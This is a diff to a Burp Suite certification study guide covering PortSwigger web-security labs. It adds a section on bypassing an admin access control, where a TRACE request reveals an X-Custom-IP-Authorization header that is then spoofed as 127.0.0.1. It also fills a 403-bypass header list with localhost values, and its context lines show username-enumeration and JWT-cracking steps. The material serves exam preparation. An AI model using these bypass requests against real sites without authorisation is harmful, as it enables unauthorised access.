@@ -1268,7 +1268,7 @@ X-Forwarded-For: 12.13.14.15
 [PortSwigger Lab: Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)  
 
 >Another scenario to identify valid username on the WEB APP is to provide list of usernames on login and one invalid password value. In the Intruder attack results one response will contain message `Incorrect password`.  
->Intruder attack injection position, `username=§invalid-username§&password=SomeStupidLongWrongPassword123456789`.  
+>Intruder attack injection position, `username=§invalid-username§&password=SomeStupidLongCrazyWrongSecretPassword123456789`.  
 
 [PortSwigger Lab: Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)  
   
@@ -2004,6 +2004,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 [JSON roleid PrivEsc](#privesc-json-roleid)  
 [Original URL](#original-url)  
 [Drop Select a role](#drop-select-a-role)  
+[Trace to Admin](#trace-to-admin)  
 
 ### PrivEsc JSON RoleId  
 
@@ -2057,6 +2058,21 @@ X-Original-URL: /admin
   
 [PortSwigger Lab: URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)  
   
+### Trace to Admin  
+
+>Unable to reach `/admin` portal, but when changing the GET request to `TRACE /admin` this response contain an `X-Custom-IP-Authorization: ` header. Use the ***identified*** header to by access control to the admin authentication.  
+
+![trace info](images/trace-info.png)  
+
+```
+GET /admin HTTP/2
+Host: TARGET.net
+X-Custom-Ip-Authorization: 127.0.0.1
+Cookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm
+```  
+
+[PortSwigger Lab: Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)  
+
 -----
 
 ## CORS  
@@ -2501,6 +2517,8 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 
 [PortSwigger Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)  
   
+-----
+
 ## SSTI - Server Side Template Injection  
 
 [SSTI Identified](#ssti-identified)  
@@ -2665,7 +2683,9 @@ wrtz{{#with "s" as |string|}}
 [PortSwigger Research SSTI](https://portswigger.net/research/server-side-template-injection)  
 
 >Note: ***Identify*** the Update forgot email template message under the admin_panel at the path /update_forgot_email.  
-  
+
+-----
+
 ## File Path Traversal
 
 [LFI Attacks](#lfi-attacks)  
@@ -2724,12 +2744,12 @@ python3 403bypasser.py -u https://TARGET.net -d /secret
 >Adding Headers in request with value `127.0.0.1` or `localhost` can also help in bypassing restrictions.  
 
 ```html
-X-Custom-IP-Authorization
-X-Forwarded-For
-X-Forward-For
-X-Remote-IP
-X-Client-IP
-X-Real-IP
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forward-For: localhost
+X-Remote-IP: localhost
+X-Client-IP: localhost
+X-Real-IP: localhost
 
 X-Originating-IP: 127.0.0.1
 X-Forwarded: 127.0.0.1
@@ -2741,11 +2761,11 @@ Client-IP: 127.0.0.1
 True-Client-IP: 127.0.0.1
 Cluster-Client-IP: 127.0.0.1
 X-ProxyUser-Ip: 127.0.0.1
-
-Host: localhost
 ```  
 
 [HackTricks Bypass 403 Forbidden paths](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)  
+
+-----
 
 ## File Uploads  
   
@@ -2850,7 +2870,9 @@ csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=http://localhost:6566/
    </script>
 </svg>
 ```  
-  
+
+-----
+
 ## Deserialization  
 
 [CustomTemplate PHP](#customtemplate-php)  
@@ -2956,7 +2978,9 @@ echo $cookie;
 >Replace cookie value and send request to get remote code execution (RCE) when cookie is deserialised server side. Ignore the server response ```HTTP/2 500 Internal Server Error```, check the collaborator if data was received.  
 
 [PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
-  
+
+-----
+
 ## OS Command Injection
 
 [Feedback](#feedback)  
@@ -3020,7 +3044,9 @@ GET /image?filename=output.txt HTTP/2
 ```  
   
 [PortSwigger Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)  
-  
+
+-----
+
 # Appendix  
 
 >This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python scripts and [Obfuscation](#obfuscation) techniques to bypass filters.   
